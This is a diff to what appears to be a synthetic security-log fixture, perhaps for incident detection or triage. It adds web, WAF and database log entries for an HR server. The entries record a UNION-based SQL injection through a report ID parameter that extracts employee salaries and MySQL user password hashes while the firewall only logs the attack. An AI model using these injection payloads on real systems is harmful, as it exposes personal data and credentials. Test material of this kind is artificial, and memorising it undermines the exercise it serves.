@@ -241,5 +241,49 @@
       "event_type": "db_status",
       "raw": "Note  Connection from 203.0.113.150 closed after 52.1s, 3284119 bytes sent"
     }
+  ],
+  "SRV-HR-11": [
+    {
+      "ts": "2026-09-11T07:30:58Z",
+      "source": "apache/access",
+      "event_type": "http_request",
+      "raw": "198.51.100.203 - - [11/Sep/2026:07:30:58] \"GET /portal/reports?id=7 HTTP/1.1\" 200 1130"
+    },
+    {
+      "ts": "2026-09-11T07:31:04Z",
+      "source": "modsecurity",
+      "event_type": "waf_alert",
+      "raw": "[id \"942100\"] SQL Injection Attack Detected via libinjection - DetectionOnly mode, request PASSED to application, logged only."
+    },
+    {
+      "ts": "2026-09-11T07:31:05Z",
+      "source": "apache/access",
+      "event_type": "http_request",
+      "raw": "198.51.100.203 - - [11/Sep/2026:07:31:05] \"GET /portal/reports?id=7%20UNION%20SELECT%20name,salary%20FROM%20hr_salary HTTP/1.1\" 200 1130"
+    },
+    {
+      "ts": "2026-09-11T07:31:06Z",
+      "source": "mysql/general",
+      "event_type": "db_query",
+      "raw": "Query SELECT id,title FROM hr_public.notices WHERE id=7 UNION SELECT name,salary FROM hr_salary"
+    },
+    {
+      "ts": "2026-09-11T07:31:41Z",
+      "source": "apache/access",
+      "event_type": "http_request",
+      "raw": "198.51.100.203 - - [11/Sep/2026:07:31:41] \"GET /portal/reports?id=7%20UNION%20SELECT%20user,authentication_string%20FROM%20mysql.user HTTP/1.1\" 200 1130"
+    },
+    {
+      "ts": "2026-09-11T07:31:42Z",
+      "source": "mysql/general",
+      "event_type": "db_query",
+      "raw": "Query SELECT id,title FROM hr_public.notices WHERE id=7 UNION SELECT user,authentication_string FROM mysql.user"
+    },
+    {
+      "ts": "2026-09-11T07:32:20Z",
+      "source": "mysql/general",
+      "event_type": "db_query",
+      "raw": "Query SELECT id,title FROM hr_public.notices WHERE id=7 UNION SELECT name,salary FROM hr_salary"
+    }
   ]
 }
